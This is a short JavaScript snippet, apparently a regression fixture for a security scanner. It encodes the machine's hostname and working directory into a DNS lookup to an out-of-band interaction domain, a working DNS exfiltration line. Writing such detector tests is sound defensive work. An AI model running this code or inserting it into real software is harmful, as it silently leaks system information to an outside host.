// Static regression control: encoded JSON really contributes to the DNS name.
const os = require('os'), dns = require('dns');
const encoded = Buffer.from(JSON.stringify({host:os.hostname(),cwd:process.cwd()})).toString('base64');
dns.lookup(`${encoded}.abcdefghijklmnop.oast.pro`, () => {});
